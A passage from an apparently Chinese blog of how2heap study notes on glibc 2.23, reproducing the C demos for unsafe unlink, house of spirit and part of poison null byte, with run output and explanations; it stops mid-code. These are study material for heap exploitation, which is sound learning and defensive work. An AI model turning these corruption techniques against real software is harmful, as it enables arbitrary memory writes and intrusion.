<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome to unsafe unlink 2.0!\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Tested in Ubuntu 14.04/16.04 64bit.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line">	<span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="type">uint64_t</span> *chunk1_ptr  = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The global chunk0_ptr is at %p, pointing to %p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The victim chunk we are going to corrupt is at %p\n\n"</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We create a fake chunk inside chunk0.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Fake chunk fd: %p\n"</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Fake chunk bk: %p\n\n"</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n"</span>);</span><br><span class="line">	<span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n"</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n"</span>,(<span class="type">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n"</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n"</span>);</span><br><span class="line">	<span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Original value: %s\n"</span>,victim_string);</span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"New Value: %s\n"</span>,victim_string);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// sanity check</span></span><br><span class="line">	assert(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这个就是一个典型的unlink attack。伪造fd和bk再将下一个chunk的pre_size和size改掉然后释放掉，就可以控制到fd和bk那里的值。（之所以要伪造prev_size和size是因为2.23下的检测</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/5.png"></p>
<p>如上图所示<code>chunk0_ptr[3] = (uint64_t) victim_string;</code>3被改成了hello!~。这个例子使用了unlink attack实现了实现任意地址读/写。想要看更加具体的unlink attack笔者在前面的文章中已经写过了里面有实战内容。</p>
<p>最后的运行结果</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Welcome to unsafe unlink 2.0!</span><br><span class="line">Tested in Ubuntu 14.04/16.04 64bit.</span><br><span class="line">This technique can be used when you have a pointer at a known location to a region you can call unlink on.</span><br><span class="line">The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.</span><br><span class="line">The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.</span><br><span class="line"></span><br><span class="line">The global chunk0_ptr is at 0x55d597f58068, pointing to 0x55d59851c010</span><br><span class="line">The victim chunk we are going to corrupt is at 0x55d59851c0a0</span><br><span class="line"></span><br><span class="line">We create a fake chunk inside chunk0.</span><br><span class="line">We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.</span><br><span class="line">We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.</span><br><span class="line">With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False</span><br><span class="line">Fake chunk fd: 0x55d597f58050</span><br><span class="line">Fake chunk bk: 0x55d597f58058</span><br><span class="line"></span><br><span class="line">We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.</span><br><span class="line">We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.</span><br><span class="line">It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly</span><br><span class="line">If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x80</span><br><span class="line">We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.</span><br><span class="line"></span><br><span class="line">Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.</span><br><span class="line">You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344</span><br><span class="line"></span><br><span class="line">At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.</span><br><span class="line">chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.</span><br><span class="line">Original value: Hello!~</span><br><span class="line">New Value: BBBBAAAA��Q��U</span><br></pre></td></tr></tbody></table></figure>

<h3 id="house-of-spirit-伪造chunk"><a href="#house-of-spirit-伪造chunk" class="headerlink" title="house_of_spirit(伪造chunk)"></a>house_of_spirit(伪造chunk)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates the house of spirit attack.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Calling malloc() once so that it sets up its memory.\n"</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We will now overwrite a pointer to point to a fake 'fastbin' region.\n"</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a;</span><br><span class="line">	<span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n"</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span>);</span><br><span class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">	fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the overwritten pointer.\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(0x30): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>house of spirit的核心就是在伪造chunk，然后将指针覆盖就可以申请到目标地址</p>
<p>这里首先创建了一个空指针，还有一个栈上的数组，接着在这个数组上构造了chunk的必要条件</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/6.png"></p>
<p>覆盖了指针为数组的第三个元素，释放这个指针，可以释放成功的原因是因为chunk的必要条件已经构造好了，堆管理把这个伪造的chunk认为是一个正常的chunk。最后申请一个大小的size就可以控制目标地址了。</p>
<p>运行结果</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">This file demonstrates the house of spirit attack.</span><br><span class="line">Calling malloc() once so that it sets up its memory.</span><br><span class="line">We will now overwrite a pointer to point to a fake 'fastbin' region.</span><br><span class="line">This region (memory of length: 80) contains two chunks. The first starts at 0x7fffffffdce8 and the second at 0x7fffffffdd28.</span><br><span class="line">This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.</span><br><span class="line">... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. </span><br><span class="line">The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.</span><br><span class="line">Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7fffffffdce8.</span><br><span class="line">... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.</span><br><span class="line">Freeing the overwritten pointer.</span><br><span class="line">Now the next malloc will return the region of our fake chunk at 0x7fffffffdce8, which will be 0x7fffffffdcf0!</span><br><span class="line">malloc(0x30): 0x7fffffffdcf0</span><br></pre></td></tr></tbody></table></figure>

<h3 id="poison-null-byte-off-by-null"><a href="#poison-null-byte-off-by-null" class="headerlink" title="poison_null_byte(off-by-null)"></a>poison_null_byte(off-by-null)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome to poison null byte 2.0!\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Tested in Ubuntu 16.04 64bit.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint8_t</span>* a;</span><br><span class="line">	<span class="type">uint8_t</span>* b;</span><br><span class="line">	<span class="type">uint8_t</span>* c;</span><br><span class="line">	<span class="type">uint8_t</span>* b1;</span><br><span class="line">	<span class="type">uint8_t</span>* b2;</span><br><span class="line">	<span class="type">uint8_t</span>* d;</span><br><span class="line">	<span class="type">void</span> *barrier;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We allocate 0x100 bytes for 'a'.\n"</span>);</span><br><span class="line">	a = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"a: %p\n"</span>, a);</span><br><span class="line">	<span class="type">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Since we want to overflow 'a', we need to know the 'real' size of 'a' "</span></span><br><span class="line">		<span class="string">"(it may be more than 0x100 because of rounding): %#x\n"</span>, real_a_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment">	 * the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment">	 * the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">	b = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"b: %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line">	c = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"c: %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"</span></span><br><span class="line">		<span class="string">"The barrier is not strictly necessary, but makes things less confusing\n"</span>, barrier);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* b_size_ptr = (<span class="type">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line">	<span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line">	<span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line">	<span class="comment">//*(size_t*)(b+0x1f0) = 0x200;</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"In newer versions of glibc we will need to have our updated size inside b itself to pass "</span></span><br><span class="line">		<span class="string">"the check 'chunksize(P) != prev_size (next_chunk(P))'\n"</span>);</span><br><span class="line">	<span class="comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span></span><br><span class="line">	<span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">	*(<span class="type">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"b.size is: (0x200 + 0x10) | prev_in_use\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We overflow 'a' with a single null byte into the metadata of 'b'\n"</span>);</span><br><span class="line">	a[real_a_size] = <span class="number">0</span>; <span class="comment">// &lt;--- THIS IS THE "EXPLOITED BUG"</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* c_prev_size_ptr = ((<span class="type">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"c.prev_size is %#lx\n"</span>,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// This malloc will result in a call to unlink on the chunk where b was.</span></span><br><span class="line">	<span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span></span><br><span class="line">	<span class="comment">// will detect the heap corruption now.</span></span><br><span class="line">	<span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span></span><br><span class="line">	<span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span></span><br><span class="line">	<span class="comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span></span><br><span class="line">	<span class="comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n"</span>,</span><br><span class="line">		*((<span class="type">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="type">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="type">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">	b1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"b1: %p\n"</span>,b1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now we malloc 'b1'. It will be placed where 'b' was. "</span></span><br><span class="line">		<span class="string">"At this point c.prev_size should have been updated, but it was not: %#lx\n"</span>,*c_prev_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Interestingly, the updated value of c.prev_size has been written 0x10 bytes "</span></span><br><span class="line">		<span class="string">"before c.prev_size: %lx\n"</span>,*(((<span class="type">uint64_t</span>*)c)<span class="number">-4</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We malloc 'b2', our 'victim' 